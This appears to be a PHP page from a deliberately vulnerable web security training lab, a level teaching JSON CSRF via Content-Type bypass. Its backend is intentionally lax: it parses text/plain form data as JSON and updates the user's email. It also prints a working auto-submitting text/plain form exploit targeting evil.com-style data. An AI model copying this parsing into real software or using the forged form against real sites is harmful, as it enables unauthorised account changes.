<?php
/**
 * Pikachu-Enhanced v2.0 - CSRF 进阶关卡 3: JSON API 表单编码混淆欺骗
 */
$PIKA_ROOT_DIR = "../../../";
include_once $PIKA_ROOT_DIR . "inc/config.inc.php";
include_once $PIKA_ROOT_DIR . "inc/function.php";
include_once $PIKA_ROOT_DIR . "inc/mysql.inc.php";

$ACTIVE = array_fill(0, 250, '');
$ACTIVE[25] = 'active open';
$ACTIVE[32] = 'active';

$link = connect();

if (!isset($_SESSION['csrf']['username'])) {
    $_SESSION['csrf']['username'] = 'vince';
}

$alert_msg = "";
$alert_type = "";
$raw_input = file_get_contents('php://input');

// 模拟 RESTful JSON API 接口
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // 很多现代后端仅简单尝试 json_decode，而没有严格检查 Content-Type 是否为 application/json
    $json_data = json_decode($raw_input, true);
    
    // 如果直接从 raw input 解析失败，检查是否使用了 text/plain 键名混淆技巧
    if (!$json_data && !empty($_POST)) {
        // 解析形如 {"email":"...","phone":"..."} 的 text/plain payload
        foreach ($_POST as $k => $v) {
            $candidate = $k . '=' . $v;
            $parsed = json_decode($candidate, true);
            if ($parsed) {
                $json_data = $parsed;
                break;
            }
        }
    }

    if ($json_data && isset($json_data['email'])) {
        $email = escape($link, $json_data['email']);
        $phone = escape($link, $json_data['phonenum'] ?? '13888889999');
        $user = escape($link, $_SESSION['csrf']['username']);
        
        $query = "UPDATE member SET email='$email', phonenum='$phone' WHERE username='$user'";
        execute($link, $query);
        
        $alert_type = "danger";
        $alert_msg = "💥 <b>JSON CSRF 攻击成功触发！</b> 服务端成功从原始请求体中解析了 JSON Payload 并完成了更新：邮箱 -> <code>{$email}</code>！";
    }
}

$user_safe = escape($link, $_SESSION['csrf']['username']);
$res = execute($link, "SELECT * FROM member WHERE username='$user_safe'");
$member = mysqli_fetch_assoc($res);

$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
$host = $_SERVER['HTTP_HOST'] ?? '127.0.0.1:8765';
$api_url = "{$protocol}{$host}/vul/csrf/csrf_json/csrf_json.php";

$poc_json_form = <<<HTML
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>JSON CSRF Exploit</title>
</head>
<body>
    <h3>正在为您处理请求...</h3>
    <!-- 利用 enctype="text/plain" 构造无预检 OPTIONS 的跨站伪造 JSON 请求 -->
    <form id="jsonCsrfForm" action="{$api_url}" method="POST" enctype="text/plain">
        <input name='{"email":"hacker_json@evil.com","phonenum":"13966668888","ignore":"' value='test"}' type="hidden" />
    </form>
    <script>
        document.getElementById('jsonCsrfForm').submit();
    </script>
</body>
</html>
HTML;

include_once $PIKA_ROOT_DIR . 'header.php';
?>

<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li><i class="ace-icon fa fa-home home-icon"></i><a href="../csrf.php">CSRF</a></li>
                <li class="active">CSRF 进阶 3: JSON 表单混淆欺骗</li>
            </ul>
        </div>

        <div class="page-content">
            <div class="cyber-stage-container">
                <div class="cyber-header-card">
                    <h1 class="cyber-header-title">
                        🎯 关卡 6: JSON REST API 跨站表单编码混淆欺骗
                        <span class="cyber-badge-chip">现代 API 漏洞 · Content-Type 绕过 · 250 PTS</span>
                    </h1>
                    <p class="cyber-desc-text">
                        现代前后端分离应用大量使用 JSON 传输参数。开发者常误以为“只要接口接收 JSON，就能免疫标准 HTML 表单的 CSRF”。然而，若后端<b>未对 <code>Content-Type: application/json</code> 施加严格强校验</b>，攻击者可通过 <code>&lt;form enctype="text/plain"&gt;</code> 构造符合 JSON 语法的合法载荷，无需触发浏览器的 CORS 预检（Preflight OPTIONS）直接完成跨站伪造提交！
                    </p>
                </div>

                <?php if (!empty($alert_msg)): ?>
                    <div class="alert alert-<?php echo $alert_type; ?>" style="border-radius:8px; font-size:13.5px; font-weight:600; padding:14px 18px; margin-bottom:20px;">
                        <?php echo $alert_msg; ?>
                    </div>
                <?php endif; ?>

                <div class="row">
                    <!-- Left: Profile & JSON API Simulator -->
                    <div class="col-lg-6 col-md-12" style="margin-bottom:20px;">
                        <div class="cyber-login-card">
                            <h4 style="margin:0 0 16px 0; color:var(--text-primary); font-weight:800; font-size:16px;">
                                <i class="fa fa-exchange" style="color:#06b6d4;"></i> 当前用户状态 (<?php echo htmlspecialchars($member['username'] ?? 'vince'); ?>)
                            </h4>

                            <div style="background:var(--bg-secondary); border:1px solid var(--border-color); border-radius:8px; padding:14px; margin-bottom:18px; font-size:13px;">
                                <p style="margin:0 0 6px 0;"><b>会员邮箱：</b> <?php echo htmlspecialchars($member['email'] ?? ''); ?></p>
                                <p style="margin:0;"><b>会员手机：</b> <?php echo htmlspecialchars($member['phonenum'] ?? ''); ?></p>
                            </div>

                            <label style="font-size:13px; font-weight:700; color:var(--text-primary); margin-bottom:6px; display:block;">
                                📡 正常客户端 JSON 请求模拟 (Fetch / AJAX)：
                            </label>
                            <button type="button" class="btn btn-info btn-block" onclick="sendJsonFetch()" style="border-radius:8px; font-weight:700; padding:10px; background:linear-gradient(135deg, #06b6d4, #0891b2); border:none;">
                                <i class="fa fa-send"></i> 发送合法的 application/json 请求
                            </button>
                        </div>
                    </div>

                    <!-- Right: JSON Form Exploit Generator -->
                    <div class="col-lg-6 col-md-12" style="margin-bottom:20px;">
                        <div class="cyber-login-card">
                            <h4 style="margin:0 0 14px 0; color:var(--text-primary); font-weight:800; font-size:16px;">
                                <i class="fa fa-code" style="color:#ef4444;"></i> text/plain 伪造 JSON 表单 PoC
                            </h4>
                            <p style="color:var(--text-secondary); font-size:12.5px; line-height:1.6; margin-bottom:12px;">
                                利用表单的 <code>name</code> 与 <code>value</code> 拼接特性构造合法 JSON 格式：
                            </p>
                            <div style="background:var(--bg-secondary); border:1px solid var(--border-color); border-radius:8px; padding:12px; font-family:'Fira Code', monospace; font-size:11.5px; max-height:170px; overflow-y:auto; color:#06b6d4;">
                                <?php echo htmlspecialchars($poc_json_form); ?>
                            </div>

                            <div style="margin-top:16px;">
                                <button type="button" class="btn btn-danger btn-block" onclick="triggerJsonFormAttack()" style="border-radius:8px; font-weight:700; padding:10px;">
                                    <i class="fa fa-bolt"></i> 模拟外部站点跨站提交伪造 JSON 表单
                                </button>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Navigation -->
                <div style="display:flex; justify-content:space-between; align-items:center; border-top:1px solid var(--border-color); padding-top:18px;">
                    <a href="../csrf_token_pool/csrf_token_pool.php" class="btn btn-default" style="border-radius:8px;"><i class="fa fa-arrow-left"></i> 上一关：Token 池未绑定漏洞</a>
                    <a href="../csrf_double_cookie/csrf_double_cookie.php" class="btn btn-primary" style="border-radius:8px; font-weight:700;">下一关：双重 Cookie 校验绕过 <i class="fa fa-arrow-right"></i></a>
                </div>
            </div>
        </div>
    </div>
</div>

<form id="simulatedJsonForm" action="csrf_json.php" method="POST" enctype="text/plain" style="display:none;">
    <input name='{"email":"hacker_json@evil.com","phonenum":"13966668888","ignore":"' value='test"}' type="hidden" />
</form>

<script>
function sendJsonFetch() {
    fetch('csrf_json.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: 'normal_json@user.com', phonenum: '13812345678' })
    }).then(() => { location.reload(); });
}

function triggerJsonFormAttack() {
    if (confirm('确认模拟跨站提交 text/plain 伪造 JSON 请求？')) {
        document.getElementById('simulatedJsonForm').submit();
    }
}
</script>

<?php include_once $PIKA_ROOT_DIR . 'footer.php'; ?>
